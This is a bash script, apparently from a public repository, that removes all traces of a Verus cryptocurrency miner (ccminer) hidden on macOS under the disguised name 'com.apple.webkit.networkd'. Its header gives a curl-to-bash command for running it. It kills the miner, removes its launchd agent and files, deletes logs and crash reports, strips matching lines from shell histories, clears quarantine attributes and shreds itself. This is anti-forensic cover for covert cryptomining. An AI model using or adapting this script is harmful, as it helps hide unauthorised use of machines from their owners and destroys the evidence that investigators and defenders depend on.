#!/usr/bin/env bash
# ============================================================
# remove_mine.sh — Complete zero-trace removal of Verus miner
# Removes: binary, build dir, launchd job, all logs, quarantine
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_mine.sh | bash
# ============================================================

DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"

# ---- 1. Kill the process immediately ----
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null
pkill -9 -f "ccminer" 2>/dev/null
sleep 1

# ---- 2. Unload & remove launchd job ----
launchctl unload -w "$PLIST_PATH" 2>/dev/null
launchctl remove "$DISGUISE_NAME" 2>/dev/null
rm -f "$PLIST_PATH"

# ---- 3. Remove binary + build dir ----
rm -rf "$INSTALL_DIR"

# ---- 4. Wipe all logs ----
rm -f "$LOG_PATH"
rm -f "$HOME/Library/Logs/${DISGUISE_NAME}"*

# ---- 5. Wipe shell history entries ----
# bash
if [[ -f "$HOME/.bash_history" ]]; then
  sed -i '' '/mine\.sh/d'         "$HOME/.bash_history" 2>/dev/null
  sed -i '' '/remove_mine/d'      "$HOME/.bash_history" 2>/dev/null
  sed -i '' '/webkit\.networkd/d' "$HOME/.bash_history" 2>/dev/null
  sed -i '' '/ccminer/d'          "$HOME/.bash_history" 2>/dev/null
  sed -i '' '/luckpool/d'         "$HOME/.bash_history" 2>/dev/null
  sed -i '' '/RSwiruL/d'          "$HOME/.bash_history" 2>/dev/null
fi

# zsh (default on modern macOS)
if [[ -f "$HOME/.zsh_history" ]]; then
  sed -i '' '/mine\.sh/d'         "$HOME/.zsh_history" 2>/dev/null
  sed -i '' '/remove_mine/d'      "$HOME/.zsh_history" 2>/dev/null
  sed -i '' '/webkit\.networkd/d' "$HOME/.zsh_history" 2>/dev/null
  sed -i '' '/ccminer/d'          "$HOME/.zsh_history" 2>/dev/null
  sed -i '' '/luckpool/d'         "$HOME/.zsh_history" 2>/dev/null
  sed -i '' '/RSwiruL/d'          "$HOME/.zsh_history" 2>/dev/null
fi

# fish
if [[ -f "$HOME/.local/share/fish/fish_history" ]]; then
  sed -i '' '/mine\.sh/d'         "$HOME/.local/share/fish/fish_history" 2>/dev/null
  sed -i '' '/ccminer/d'          "$HOME/.local/share/fish/fish_history" 2>/dev/null
  sed -i '' '/luckpool/d'         "$HOME/.local/share/fish/fish_history" 2>/dev/null
fi

# clear current session history in memory
history -c 2>/dev/null || true

# ---- 6. Remove quarantine traces ----
xattr -cr "$INSTALL_DIR" 2>/dev/null || true

# ---- 7. Remove any Crash Reports referencing ccminer ----
find "$HOME/Library/Logs/DiagnosticReports" -name "*ccminer*" -delete 2>/dev/null
find "$HOME/Library/Logs/DiagnosticReports" -name "*webkit.networkd*" -delete 2>/dev/null
find "/Library/Logs/DiagnosticReports"      -name "*ccminer*" -delete 2>/dev/null

# ---- 8. Remove this script itself ----
SELF="$0"
if [[ -f "$SELF" ]]; then
  shred -u "$SELF" 2>/dev/null || rm -f "$SELF"
fi

# ---- 9. Final verify ----
RUNNING=$(launchctl list 2>/dev/null | grep "$DISGUISE_NAME" || echo "")
BINARY=$(ls "$INSTALL_DIR" 2>/dev/null || echo "")
LOG=$(ls "$LOG_PATH" 2>/dev/null || echo "")

if [[ -z "$RUNNING" && -z "$BINARY" && -z "$LOG" ]]; then
  echo "[+] Complete. Zero trace remaining."
else
  echo "[!] Something may remain:"
  [[ -n "$RUNNING" ]] && echo "    - launchd entry still active"
  [[ -n "$BINARY"  ]] && echo "    - binary dir still exists"
  [[ -n "$LOG"     ]] && echo "    - log file still present"
fi
